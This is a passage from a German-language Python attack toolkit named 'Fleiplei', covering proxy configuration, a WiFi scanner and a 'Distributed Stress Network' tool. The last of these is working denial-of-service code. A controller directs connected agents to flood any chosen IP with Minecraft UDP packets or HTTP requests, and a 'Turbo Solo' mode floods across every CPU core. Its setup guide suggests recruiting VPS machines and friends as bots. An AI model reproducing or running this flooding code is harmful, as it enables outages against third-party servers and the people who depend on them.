                chosen = f"http://{working[idx2-1][1]}"
                _PROXY_URL = chosen
                save_config({"proxy_url": _PROXY_URL})
                print(f"\n  {G}[✓] Proxy aktiviert: {_PROXY_URL}{R}")
                print(f"  {DG}Alle Fleiplei-Anfragen gehen jetzt über diesen Proxy.{R}")
                print(f"  {DG}Für System-weiten Proxy → Option 7 nutzen.{R}")
        except: pass

    # ── 7: System-weiter Proxy setzen ────────────────────────
    elif mode == "7":
        if not _PROXY_URL:
            print(f"  {G}[!] Kein Proxy in Fleiplei konfiguriert.{R}")
            print(f"  {DG}    Erst Option 1, 2 oder 6 nutzen um einen Proxy zu setzen.{R}")
            wait(); return
        # Nur HTTP-Proxies für System-weite Einstellung (SOCKS5 nur per-app)
        sys_proxy = _PROXY_URL
        if sys_proxy.startswith("socks"):
            print(f"  {YG}[!] SOCKS5-Proxies werden nicht system-weit unterstützt.{R}")
            print(f"  {DG}    Für System-weiten SOCKS5: Privoxy installieren (leitet HTTP→SOCKS5){R}")
            print(f"  {DG}    Oder einen HTTP-Proxy aus Option 6 wählen.{R}")
            wait(); return
        # Proxy-Host:Port extrahieren
        proxy_clean = re.sub(r'^https?://', '', sys_proxy).rstrip('/')
        print(f"  {DG}Setze System-Proxy: {G}{proxy_clean}{R}\n")
        if os.name == "nt":
            # Windows: Registry (WinInet — Chrome, Edge, IE, viele Apps)
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Internet Settings",
                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(key, "ProxyServer",  0, winreg.REG_SZ,    proxy_clean)
                winreg.SetValueEx(key, "ProxyOverride",0, winreg.REG_SZ,    "localhost;127.*;10.*;192.168.*;<local>")
                winreg.CloseKey(key)
                print(f"  {G}[✓] Windows Registry Proxy gesetzt (Chrome, Edge, IE, viele Apps){R}")
            except Exception as e:
                print(f"  {G}[!] Registry-Fehler: {e}{R}")
            # netsh winhttp (CLI-Tools, Windows Update etc.)
            try:
                result = subprocess.run(
                    ["netsh","winhttp","set","proxy", proxy_clean],
                    capture_output=True, text=True)
                if result.returncode == 0:
                    print(f"  {G}[✓] netsh winhttp Proxy gesetzt (CMD, PowerShell, Windows Update){R}")
                else:
                    print(f"  {YG}[!] netsh: {result.stderr.strip()[:60]}{R}")
                    print(f"  {DG}    Tipp: Als Administrator ausführen für netsh{R}")
            except Exception as e:
                print(f"  {YG}[!] netsh nicht verfügbar: {e}{R}")
            # Umgebungsvariablen für aktuelle Session
            os.environ["http_proxy"]  = sys_proxy
            os.environ["https_proxy"] = sys_proxy
            os.environ["HTTP_PROXY"]  = sys_proxy
            os.environ["HTTPS_PROXY"] = sys_proxy
            print(f"  {G}[✓] Umgebungsvariablen für diese Session gesetzt{R}")
            print(f"\n  {DG}Firefox nutzt eigene Proxy-Einstellungen — dort manuell setzen.{R}")
        else:
            # Linux/Mac: /etc/environment + ~/.bashrc
            env_line_http  = f'http_proxy="{sys_proxy}"'
            env_line_https = f'https_proxy="{sys_proxy}"'
            env_line_all   = f'all_proxy="{sys_proxy}"'
            # ~/.bashrc
            bashrc = os.path.expanduser("~/.bashrc")
            try:
                with open(bashrc, "r") as f: content = f.read()
                if "http_proxy" not in content:
                    with open(bashrc, "a") as f:
                        f.write(f"\n# Fleiplei proxy\nexport {env_line_http}\nexport {env_line_https}\nexport {env_line_all}\n")
                    print(f"  {G}[✓] ~/.bashrc aktualisiert{R}")
                else:
                    print(f"  {YG}[!] ~/.bashrc enthält bereits http_proxy — manuell anpassen{R}")
            except Exception as e:
                print(f"  {G}[!] ~/.bashrc: {e}{R}")
            # /etc/environment (system-weit, braucht sudo)
            try:
                env_file = "/etc/environment"
                with open(env_file, "r") as f: env_content = f.read()
                if "http_proxy" not in env_content.lower():
                    with open(env_file, "a") as f:
                        f.write(f"\n{env_line_http}\n{env_line_https}\n{env_line_all}\n")
                    print(f"  {G}[✓] /etc/environment gesetzt (system-weit nach Neustart){R}")
                else:
                    print(f"  {YG}[!] /etc/environment enthält bereits Proxy — manuell prüfen{R}")
            except PermissionError:
                print(f"  {YG}[!] /etc/environment: Keine Rechte (sudo nötig){R}")
                print(f"  {DG}    sudo bash -c 'echo \"{env_line_http}\" >> /etc/environment'{R}")
            except Exception as e:
                print(f"  {G}[!] /etc/environment: {e}{R}")
            # Umgebungsvariablen aktuelle Session
            os.environ["http_proxy"]  = sys_proxy
            os.environ["https_proxy"] = sys_proxy
            os.environ["all_proxy"]   = sys_proxy
            os.environ["HTTP_PROXY"]  = sys_proxy
            os.environ["HTTPS_PROXY"] = sys_proxy
            print(f"  {G}[✓] Umgebungsvariablen für diese Session gesetzt{R}")
        save_config({"system_proxy": proxy_clean})
        print(f"\n  {YG}System-Proxy: {proxy_clean}{R}")
        print(f"  {DG}Browser neu starten damit sie den Proxy übernehmen.{R}")

    # ── 8: System-Proxy entfernen ────────────────────────────
    elif mode == "8":
        print(f"  {DG}Entferne System-Proxy ...{R}\n")
        if os.name == "nt":
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Internet Settings",
                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
                print(f"  {G}[✓] Windows Registry Proxy deaktiviert{R}")
            except Exception as e:
                print(f"  {G}[!] Registry: {e}{R}")
            try:
                subprocess.run(["netsh","winhttp","reset","proxy"], capture_output=True)
                print(f"  {G}[✓] netsh winhttp Proxy zurückgesetzt{R}")
            except: pass
            for var in ("http_proxy","https_proxy","HTTP_PROXY","HTTPS_PROXY"):
                os.environ.pop(var, None)
            print(f"  {G}[✓] Umgebungsvariablen entfernt{R}")
        else:
            print(f"  {DG}Entferne aus ~/.bashrc ...{R}")
            bashrc = os.path.expanduser("~/.bashrc")
            try:
                with open(bashrc,"r") as f: lines = f.readlines()
                new_lines = [l for l in lines if not any(
                    x in l for x in ("http_proxy","https_proxy","all_proxy","# Fleiplei proxy"))]
                with open(bashrc,"w") as f: f.writelines(new_lines)
                print(f"  {G}[✓] ~/.bashrc bereinigt{R}")
            except Exception as e:
                print(f"  {G}[!] ~/.bashrc: {e}{R}")
            for var in ("http_proxy","https_proxy","all_proxy","HTTP_PROXY","HTTPS_PROXY"):
                os.environ.pop(var, None)
        _PROXY_URL = ""
        save_config({"proxy_url": "", "system_proxy": ""})
        print(f"\n  {G}[✓] System-Proxy entfernt. Browser neu starten.{R}")

    wait()

_DSN_PORT = 19283   # Distributed Stress Network default port

import multiprocessing as _mp
import ctypes as _ctypes

def _turbo_mc_proc(target, port, duration, sent_val, err_val):
    """Worker-Prozess für MC-UDP-Flood (läuft parallel, umgeht GIL)."""
    payloads = [
        b"\xfe\x01",
        b"\x00\x00\x00\x00\x09\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01",
        bytes([0x02]) + b"\x00" * 256,
        b"\xff\xff\xff\xff\x09\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01",
    ]
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
        sock.setblocking(False)
    except: return
    deadline = time.time() + duration
    idx = 0
    while time.time() < deadline:
        try:
            sock.sendto(payloads[idx & 3], (target, port))
            with sent_val.get_lock(): sent_val.value += 1
        except:
            with err_val.get_lock():  err_val.value  += 1
        idx += 1

def _turbo_http_proc(target, port, duration, sent_val, err_val):
    """Worker-Prozess für HTTP-Flood."""
    url = f"http://{target}:{port}/" if not target.startswith("http") else target
    deadline = time.time() + duration
    while time.time() < deadline:
        try:
            import http.client
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": f"Mozilla/5.0 ({random.randint(1,9999)})"})
            conn.getresponse()
            conn.close()
            with sent_val.get_lock(): sent_val.value += 1
        except:
            with err_val.get_lock(): err_val.value += 1

def wifi_scanner():
    """Tool 84 — Scannt benachbarte WLAN-Netzwerke."""
    hdr("WIFI SCANNER")
    _spinner("Scanne WLAN-Netzwerke...", 1.5)
    W = 68
    networks = []
    termux_error = ""

    if os.name == "nt":
        # Windows: netsh wlan show networks mode=bssid
        try:
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                stderr=subprocess.DEVNULL
            ).decode("utf-8", errors="ignore")
            current = {}
            for line in out.splitlines():
                s = line.strip()
                if s.lower().startswith("ssid") and "bssid" not in s.lower():
                    if current:
                        networks.append(current)
                    current = {"ssid": s.split(":",1)[1].strip() if ":" in s else "?",
                               "bssid":"?","signal":"?","channel":"?","security":"?"}
                elif s.lower().startswith("bssid"):
                    current["bssid"] = s.split(":",1)[1].strip() if ":" in s else "?"
                elif "signal" in s.lower():
                    current["signal"] = s.split(":",1)[1].strip() if ":" in s else "?"
                elif "kanal" in s.lower() or "channel" in s.lower():
                    current["channel"] = s.split(":",1)[1].strip() if ":" in s else "?"
                elif "authentifizierung" in s.lower() or "authentication" in s.lower():
                    current["security"] = s.split(":",1)[1].strip() if ":" in s else "?"
            if current.get("ssid"):
                networks.append(current)
        except Exception as e:
            print(f"  {G}[!] Fehler: {e}{R}")

    else:
        # Linux: nmcli oder iwlist
        parsed = False

        # Methode 1: nmcli
        try:
            out = subprocess.check_output(
                ["nmcli", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY",
                 "dev", "wifi", "list"],
                stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            lines = out.splitlines()
            for line in lines[1:]:  # Header überspringen
                parts = line.split()
                if len(parts) >= 2:
                    networks.append({
                        "ssid":     parts[0] if parts[0] != "--" else "(hidden)",
                        "bssid":    parts[1] if len(parts) > 1 else "?",
                        "signal":   parts[2] if len(parts) > 2 else "?",
                        "channel":  parts[3] if len(parts) > 3 else "?",
                        "security": parts[4] if len(parts) > 4 else "?",
                    })
            parsed = bool(networks)
        except Exception:
            pass

        # Methode 2: iwlist scan (benötigt oft sudo/root)
        if not parsed:
            try:
                iface = "wlan0"
                # Interface autodetect
                try:
                    ifaces_out = subprocess.check_output(
                        ["ip", "link", "show"], stderr=subprocess.DEVNULL
                    ).decode(errors="ignore")
                    for m in re.finditer(r'\d+:\s+(wl\S+):', ifaces_out):
                        iface = m.group(1); break
                except Exception:
                    pass

                out = subprocess.check_output(
                    ["iwlist", iface, "scan"],
                    stderr=subprocess.DEVNULL
                ).decode(errors="ignore")
                current = {}
                for line in out.splitlines():
                    s = line.strip()
                    if s.startswith("Cell "):
                        if current.get("ssid"):
                            networks.append(current)
                        bssid_m = re.search(r'Address:\s*(\S+)', s)
                        current = {"ssid":"?","bssid":bssid_m.group(1) if bssid_m else "?",
                                   "signal":"?","channel":"?","security":"Open"}
                    elif "ESSID" in s:
                        m = re.search(r'ESSID:"([^"]*)"', s)
                        if m: current["ssid"] = m.group(1) or "(hidden)"
                    elif "Frequency" in s:
                        m = re.search(r'Channel\s*(\d+)', s)
                        if m: current["channel"] = m.group(1)
                    elif "Signal level" in s:
                        m = re.search(r'Signal level[=:]([^\s]+)', s)
                        if m: current["signal"] = m.group(1)
                    elif "Encryption key:on" in s:
                        current["security"] = "WPA/WEP"
                    elif "IE: WPA" in s or "IE: IEEE 802.11i/WPA2" in s:
                        current["security"] = "WPA2"
                if current.get("ssid") and current["ssid"] != "?":
                    networks.append(current)
                parsed = bool(networks)
            except Exception:
                pass

        # Methode 3: termux-wifi-connectioninfo (aktuelles Netz — kein Root nötig)
        termux_error = ""
        if not parsed:
            try:
                raw2 = subprocess.check_output(
                    ["termux-wifi-connectioninfo"],
                    stderr=subprocess.STDOUT, timeout=8
                ).decode(errors="ignore").strip()
                if '"error"' in raw2:
                    termux_error = json.loads(raw2).get("error", raw2[:80])
                else:
                    d = json.loads(raw2)
                    ssid = d.get("ssid","")
                    if ssid and ssid != "<unknown ssid>":
                        networks.append({
                            "ssid":     ssid,
                            "bssid":    d.get("bssid","?"),
                            "signal":   str(d.get("rssi","?")),
                            "channel":  str(d.get("frequency","?")),
                            "security": "verbunden",
                        })
                        parsed = True
            except FileNotFoundError:
                termux_error = "termux-api fehlt  →  pkg install termux-api"
            except subprocess.TimeoutExpired:
                termux_error = "Timeout — Termux:API App installiert und Berechtigungen gesetzt?"
            except Exception as ex:
                termux_error = str(ex)[:80]

        # Methode 4: termux-wifi-scaninfo (alle Netze, braucht Standort-Permission)
        if not parsed or len(networks) < 2:
            try:
                raw3 = subprocess.check_output(
                    ["termux-wifi-scaninfo"],
                    stderr=subprocess.STDOUT, timeout=12
                ).decode(errors="ignore").strip()
                if '"error"' not in raw3:
                    data = json.loads(raw3)
                    if not isinstance(data, list):
                        data = [data]
                    existing_bssids = {n["bssid"] for n in networks}
                    for net in data:
                        b = net.get("bssid","?")
                        if b not in existing_bssids:
                            networks.append({
                                "ssid":     net.get("ssid") or "(hidden)",
                                "bssid":    b,
                                "signal":   str(net.get("level","?")),
                                "channel":  str(net.get("frequency","?")),
                                "security": (net.get("capabilities","") or "?")[:12],
                            })
            except Exception:
                pass

    # Ausgabe
    print(f"\n  {DG}╔{'═'*W}╗{R}")
    c1 = _pad(f"  {YG}{'SSID':<20}{R}", 22)
    c2 = _pad(f"  {YG}{'SIGNAL':<8}{R}", 10)
    c3 = _pad(f"  {YG}{'CH':<4}{R}", 6)
    c4 = _pad(f"  {YG}{'SECURITY':<14}{R}", 16)
    c5 = _pad(f"  {YG}{'BSSID':<17}{R}", 16)
    print(f"  {DG}║{R}{c1}{c2}{c3}{c4}{c5}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    if not networks:
        hints = [
            "Keine Netzwerke gefunden.",
            "",
            "Android/Termux — Schritt fuer Schritt:",
            "  1. pkg install termux-api",
            "  2. Termux:API App aus F-Droid installieren",
            "  3. In Android: Termux:API -> Standort erlauben",
            "  4. Tool 84 nochmal starten",
        ]
        if termux_error:
            hints.append("")
            hints.append("Fehler: " + termux_error[:50])
        for hint in hints:
            print(f"  {DG}║{R}{_pad(f'  {DIM}{hint}{R}', W)}{DG}║{R}")
    else:
        for n in sorted(networks, key=lambda x: x.get("signal","0"), reverse=True):
            ssid = n["ssid"][:18]
            sig  = n["signal"][:8]
            ch   = n["channel"][:4]
            sec  = n["security"][:14]
            bss  = n["bssid"][:17]
            col  = YG if "WPA" in sec.upper() or "WEP" in sec.upper() else G
            r1 = _pad(f"  {G}{ssid:<20}{R}", 22)
            r2 = _pad(f"  {col}{sig:<8}{R}", 10)
            r3 = _pad(f"  {DIM}{ch:<4}{R}", 6)
            r4 = _pad(f"  {col}{sec:<14}{R}", 16)
            r5 = _pad(f"  {DIM}{bss:<17}{R}", 16)
            print(f"  {DG}║{R}{r1}{r2}{r3}{r4}{r5}{DG}║{R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    note = _pad(f"  {DIM}{len(networks)} Netzwerke  |  termux-api / nmcli / iwlist{R}", W)
    print(f"  {DG}║{R}{note}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    input(f"  {DG}[ENTER]{R} ")


def dist_stress_network():
    """Tool 83 — Distributed Stress Network: Controller + Agent + Turbo + VPS-Deploy."""
    hdr("Distributed Stress Network")
    print(f"  {DG}[{G}1{DG}]{R} {G}» Controller      — koordiniert alle Agents{R}")
    print(f"  {DG}[{G}2{DG}]{R} {G}» Agent           — verbindet sich mit Controller{R}")
    print(f"  {DG}[{G}3{DG}]{R} {G}» Anleitung       — Setup auf mehreren PCs{R}")
    print(f"  {DG}[{G}4{DG}]{R} {YG}» Turbo Solo      — alle CPU-Kerne dieser Maschine{R}")
    print(f"  {DG}[{G}5{DG}]{R} {YG}» VPS Auto-Deploy — VPS per SSH als Agent einrichten{R}")
    print(f"  {DG}[{G}6{DG}]{R} {C}» Internet-Tunnel  — Controller über jedes Netz erreichbar{R}")
    print(f"  {DG}[{G}7{DG}]{R} {C}» 100-Bot Turbo    — 100 virtuelle Bots auf dieser Maschine{R}")
    mode = inp("Modus (1-7)")
    div()

    # ── 1: CONTROLLER ────────────────────────────────────────
    if mode == "1":
        listen_port = _DSN_PORT
        raw_p = inp(f"Controller-Port [{listen_port}]")
        if raw_p.isdigit(): listen_port = int(raw_p)

        attack_type = inp("Angriffstyp: mc / http").lower().strip()
        if attack_type not in ("mc","http"): attack_type = "http"

        target = inp("Ziel IP / Domain")
        if not target: wait(); return
        raw_port = inp("Ziel-Port (z.B. 25565 für MC, 80 für HTTP)")
        tgt_port = int(raw_port) if raw_port.isdigit() else (25565 if attack_type=="mc" else 80)
        raw_th   = inp("Threads pro Agent (z.B. 50)")
        thr      = int(raw_th) if raw_th.isdigit() else 50
        raw_dur  = inp("Dauer in Sekunden (z.B. 60)")
        duration = int(raw_dur) if raw_dur.isdigit() else 60

        # Alle eigenen IPs ermitteln
        own_ips = []
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as _s:
                _s.connect(("8.8.8.8", 80))
                own_ips.append(_s.getsockname()[0])
        except Exception:
            pass
        try:
            for info in socket.getaddrinfo(socket.gethostname(), None):
                ip = info[4][0]
                if ip not in own_ips and not ip.startswith("127.") and ":" not in ip:
                    own_ips.append(ip)
        except Exception:
            pass
        if not own_ips:
            own_ips = ["127.0.0.1"]
        own_ip = own_ips[0]

        agents      = []   # [(sock, addr)]
        agents_lock = threading.Lock()
        stop_accept = threading.Event()
        all_stats   = {}   # addr_str → {"sent":int,"errors":int}

        def _accept_loop(srv):
            while not stop_accept.is_set():
                try:
                    srv.settimeout(1.0)
                    conn, addr = srv.accept()
                    with agents_lock:
                        agents.append((conn, addr))
                        all_stats[str(addr)] = {"sent":0,"errors":0}
                    sys.stdout.write(f"\r  {G}[+] Agent verbunden: {addr[0]}:{addr[1]}   {R}")
                    sys.stdout.flush()
                except socket.timeout:
                    continue
                except: break

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind(("0.0.0.0", listen_port))
            srv.listen(32)
        except Exception as e:
            print(f"  {G}[!] Konnte Port {listen_port} nicht öffnen: {e}{R}")
            wait(); return

        print(f"\n  {G}[✓] Controller lauscht auf Port {listen_port}{R}")
        print(f"  {DG}    ── Meine IP-Adressen (eine davon beim Agent eingeben): ──{R}")
        for ip in own_ips:
            print(f"  {DG}    ►  {YG}{ip}{DG}:{G}{listen_port}{R}")
        print(f"  {DIM}    Beide Geraete muessen im SELBEN Netzwerk (WiFi/LAN) sein!{R}")
        print(f"  {DIM}    Warte auf Agents — ENTER druecken wenn alle verbunden sind ...{R}\n")

        t_accept = threading.Thread(target=_accept_loop, args=(srv,), daemon=True)
        t_accept.start()
        input()
        stop_accept.set()

        with agents_lock:
            n_agents = len(agents)
        if n_agents == 0:
            print(f"  {G}[!] Keine Agents verbunden — Abbruch{R}")
            srv.close(); wait(); return

        print(f"\n  {G}[✓] {n_agents} Agent(s) verbunden — starte Angriff ...{R}\n")

        config = {
            "action":   "start",
            "type":     attack_type,
            "target":   target,
            "port":     tgt_port,
            "threads":  thr,
            "duration": duration,
        }
        cfg_bytes = (json.dumps(config) + "\n").encode()

        # Config an alle Agents senden + Stats-Reader starten
        def _stat_reader(conn, addr_str):
            buf = b""
            conn.settimeout(duration + 10)
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk: break
                    buf += chunk
                    while b"\n" in buf:
                        line, buf = buf.split(b"\n", 1)
                        try:
                            msg = json.loads(line.decode())
                            s   = msg.get("stats", {})
                            with agents_lock:
                                all_stats[addr_str]["sent"]   = s.get("sent",   0)
                                all_stats[addr_str]["errors"] = s.get("errors", 0)
                        except: pass
            except: pass

        stat_threads = []
        with agents_lock:
            snapshot = list(agents)
        for conn, addr in snapshot:
            try:
                conn.sendall(cfg_bytes)
            except: pass
            t = threading.Thread(target=_stat_reader, args=(conn, str(addr)), daemon=True)
            t.start()
            stat_threads.append(t)

        # Live Stats anzeigen
        print(f"  {DG}╔{'═'*60}╗{R}")
        print(f"  {DG}║{R}  {YG}LIVE STATS — {attack_type.upper()} — {target}:{tgt_port}{' '*max(0,38-len(target))}{DG}║{R}")
        print(f"  {DG}╠{'═'*60}╣{R}")
        t_start = time.time()
        while time.time() - t_start < duration:
            time.sleep(1)
            elapsed = int(time.time() - t_start)
            with agents_lock:
                total_sent   = sum(v["sent"]   for v in all_stats.values())
                total_errors = sum(v["errors"] for v in all_stats.values())
            pps = total_sent / max(elapsed, 1)
            sys.stdout.write(
                f"\r  {DG}║{R}  {G}Agents: {n_agents:<3}{R}  {DIM}Pakete:{R} {G}{total_sent:<9}{R}  "
                f"{DIM}Fehler:{R} {G}{total_errors:<7}{R}  {DIM}PPS:{R} {YG}{pps:>8.0f}{R}  "
                f"{DG}[{elapsed:>3}s/{duration}s]{R}  {DG}║{R}")
            sys.stdout.flush()
        print(f"\n  {DG}╠{'═'*60}╣{R}")
        with agents_lock:
            total_sent   = sum(v["sent"]   for v in all_stats.values())
            total_errors = sum(v["errors"] for v in all_stats.values())
        print(f"  {DG}║{R}  {YG}FERTIG{R}  {DIM}Gesamt:{R} {G}{total_sent}{R} Pakete, {G}{total_errors}{R} Fehler{' '*14}{DG}║{R}")
        print(f"  {DG}╚{'═'*60}╝{R}")

        # Stop-Signal senden
        stop_msg = (json.dumps({"action":"stop"}) + "\n").encode()
        for conn, _ in snapshot:
            try: conn.sendall(stop_msg)
            except: pass
        for t in stat_threads: t.join(timeout=3)
        for conn, _ in snapshot:
            try: conn.close()
            except: pass
        srv.close()

    # ── 2: AGENT ─────────────────────────────────────────────
    elif mode == "2":
        ctrl_ip   = inp("Controller IP")
        raw_p2    = inp(f"Controller Port [{_DSN_PORT}]")
        ctrl_port = int(raw_p2) if raw_p2.isdigit() else _DSN_PORT

        print(f"\n  {DG}Verbinde mit {ctrl_ip}:{ctrl_port} ...{R}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            sock.connect((ctrl_ip, ctrl_port))
            sock.settimeout(None)
        except socket.gaierror:
            print(f"  {G}[!] Host nicht gefunden: '{ctrl_ip}'{R}")
            print(f"  {DIM}    → Gib die IP-Adresse ein (z.B. 192.168.1.5), keinen Hostnamen{R}")
            print(f"  {DIM}    → Beide Geraete muessen im selben WiFi/LAN sein{R}")
            print(f"  {DIM}    → Controller-IP steht auf dem Controller-Geraet{R}")
            wait(); return
        except ConnectionRefusedError:
            print(f"  {G}[!] Verbindung abgelehnt — Controller laeuft noch nicht?{R}")
            print(f"  {DIM}    → Erst auf dem anderen Geraet Tool 83 → Option 1 starten{R}")
            wait(); return
        except socket.timeout:
            print(f"  {G}[!] Timeout — IP nicht erreichbar: {ctrl_ip}{R}")
            print(f"  {DIM}    → Firewall? Anderes Netzwerk? Falsche IP?{R}")
            wait(); return
        except Exception as e:
            print(f"  {G}[!] Fehler: {e}{R}")
            wait(); return

        print(f"  {G}[✓] Verbunden! Warte auf Angriffsbefehl ...{R}")
        buf = b""
        running = True
        while running:
            try:
                sock.settimeout(300)
                chunk = sock.recv(4096)
                if not chunk: break
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    try:
                        msg = json.loads(line.decode())
                    except: continue
                    action = msg.get("action","")

                    if action == "stop":
                        running = False; break

                    elif action == "start":
                        atype    = msg.get("type","http")
                        tgt      = msg.get("target","")
                        tport    = msg.get("port", 80)
                        threads  = msg.get("threads", 50)
                        duration = msg.get("duration", 30)

                        print(f"  {G}[►] Angriff: {atype.upper()} → {tgt}:{tport}  {threads} Threads  {duration}s{R}")
                        stats    = {"sent":0,"errors":0}
                        stop_evt = threading.Event()

                        def _atk(s=stats, e=stop_evt, a=atype, h=tgt, p=tport, d=duration):
                            deadline = time.time() + d
                            if a == "mc":
                                payloads = [
                                    b"\xfe\x01",
                                    b"\x00\x00\x00\x00\x09\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01",
                                    bytes([0x02]) + b"\x00" * 256,
                                ]
                                idx = 0
                                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                udp.settimeout(0.5)
                                while not e.is_set() and time.time() < deadline:
                                    try:
                                        udp.sendto(payloads[idx % len(payloads)], (h, p))
                                        s["sent"] += 1
                                    except: s["errors"] += 1
                                    idx += 1
                            else:
                                url = f"http://{h}:{p}/" if not h.startswith("http") else h
                                while not e.is_set() and time.time() < deadline:
                                    try:
                                        req = urllib.request.Request(url,
                                            headers={"User-Agent":f"Mozilla/5.0 ({random.randint(1,9999)})"})
                                        opener = _build_opener()
                                        with opener.open(req, timeout=3): pass
                                        s["sent"] += 1
                                    except: s["errors"] += 1

                        atk_threads = [threading.Thread(target=_atk, daemon=True)
                                       for _ in range(threads)]
                        for t in atk_threads: t.start()

                        # Stats alle 2s zurückschicken
                        deadline2 = time.time() + duration
                        while time.time() < deadline2 and not stop_evt.is_set():
                            time.sleep(2)
                            report = json.dumps({"stats": dict(stats)}) + "\n"
                            try: sock.sendall(report.encode())
                            except: break
                            sys.stdout.write(
                                f"\r  {DIM}Sent:{R} {G}{stats['sent']}{R}  {DIM}Err:{R} {G}{stats['errors']}{R}   ")
                            sys.stdout.flush()

                        stop_evt.set()
                        for t in atk_threads: t.join(timeout=2)
                        print(f"\n  {G}[✓] Fertig — {stats['sent']} Pakete gesendet{R}")
                        final = json.dumps({"done":True,"stats":dict(stats)}) + "\n"
                        try: sock.sendall(final.encode())
                        except: pass
            except socket.timeout:
                print(f"\n  {DIM}... warte auf Befehl ...{R}")
                continue
            except Exception as e2:
                print(f"\n  {G}[!] Verbindung getrennt: {e2}{R}")
                break
        sock.close()
        print(f"  {DIM}Agent beendet.{R}")

    # ── 3: ANLEITUNG ─────────────────────────────────────────
    elif mode == "3":
        print(f"  {YG}── Setup: Distributed Stress Network ───────────────{R}\n")
        print(f"  {G}Wie es funktioniert:{R}")
        print(f"  {DG}  1. Fleiplei auf ALLEN Maschinen kopieren{R}")
        print(f"  {DG}  2. Auf Maschine 1 (Controller): Tool 83 → Option 1{R}")
        print(f"  {DG}  3. Auf allen anderen Maschinen: Tool 83 → Option 2{R}")
        print(f"  {DG}  4. Controller-IP eingeben (die IP von Maschine 1){R}")
        print(f"  {DG}  5. Am Controller ENTER drücken → Angriff startet{R}\n")
        print(f"  {G}Wo bekommst du mehr Maschinen?{R}")
        print(f"  {DG}  · Eigene PCs / VMs im Netzwerk{R}")
        print(f"  {DG}  · VPS (Hetzner, Contabo, Vultr — ab 4€/Monat){R}")
        print(f"  {DG}  · Freunde bitten open_vs.py zu starten{R}")
        print(f"  {DG}  · WSL / Hyper-V VMs auf demselben PC{R}\n")
        print(f"  {G}Firewall-Hinweis:{R}")
        print(f"  {DG}  Windows: Defender-Popup → Zugriff erlauben{R}")
        print(f"  {DG}  Linux  : sudo ufw allow {_DSN_PORT}/tcp{R}")

    # ── 4: TURBO SOLO ────────────────────────────────────────
    elif mode == "4":
        n_cpu = _mp.cpu_count()
        print(f"  {DG}CPU-Kerne gefunden: {G}{n_cpu}{R}\n")
        attack_type = inp("Angriffstyp: mc / http").lower().strip()
        if attack_type not in ("mc", "http"): attack_type = "mc"
        target = inp("Ziel IP / Domain")
        if not target: wait(); return
        raw_port = inp("Ziel-Port (25565 für MC, 80 für HTTP)")
        tgt_port = int(raw_port) if raw_port.isdigit() else (25565 if attack_type == "mc" else 80)
        raw_dur  = inp("Dauer in Sekunden")
        duration = int(raw_dur) if raw_dur.isdigit() else 60
        raw_proc = inp(f"Anzahl Prozesse [{n_cpu}]  (je mehr, desto mehr CPU-Last)")
        n_procs  = int(raw_proc) if raw_proc.isdigit() else n_cpu

        sent_val = _mp.Value(_ctypes.c_longlong, 0)
        err_val  = _mp.Value(_ctypes.c_longlong, 0)

        worker = _turbo_mc_proc if attack_type == "mc" else _turbo_http_proc
        procs  = [_mp.Process(target=worker,
                              args=(target, tgt_port, duration, sent_val, err_val),
                              daemon=True)
                  for _ in range(n_procs)]

        print(f"\n  {G}[►] Starte {n_procs} Prozesse gegen {target}:{tgt_port} für {duration}s ...{R}\n")
        for p in procs: p.start()

        t0 = time.time()
        print(f"  {DG}╔{'═'*58}╗{R}")
        print(f"  {DG}║{R}  {YG}TURBO SOLO  {DG}│{R}  {C}{attack_type.upper()}  {DG}│{R}  {G}{target}:{tgt_port}{' '*max(0,22-len(target))}{DG}║{R}")
        print(f"  {DG}╠{'═'*58}╣{R}")
        while time.time() - t0 < duration:
            time.sleep(0.5)
            el   = time.time() - t0
            sent = sent_val.value
            errs = err_val.value
            pps  = sent / max(el, 0.1)
            sys.stdout.write(
                f"\r  {DG}║{R}  {DIM}Procs:{R} {G}{n_procs:<3}{R}  "
                f"{DIM}Pkts:{R} {G}{sent:<10}{R}  "
                f"{DIM}PPS:{R} {YG}{pps:>9.0f}{R}  "
                f"{DG}[{int(el):>3}s/{duration}s]{R}  {DG}║{R}")
            sys.stdout.flush()
        print(f"\n  {DG}╠{'═'*58}╣{R}")
        final_sent = sent_val.value
        final_errs = err_val.value
        final_pps  = final_sent / max(duration, 1)
        print(f"  {DG}║{R}  {YG}FERTIG{R}  "
              f"{DIM}Pakete:{R} {G}{final_sent}{R}  "
              f"{DIM}Fehler:{R} {G}{final_errs}{R}  "
              f"{DIM}⌀PPS:{R} {YG}{final_pps:.0f}{R}  {' '*4}{DG}║{R}")
        print(f"  {DG}╚{'═'*58}╝{R}")
        for p in procs:
            p.terminate(); p.join(timeout=2)

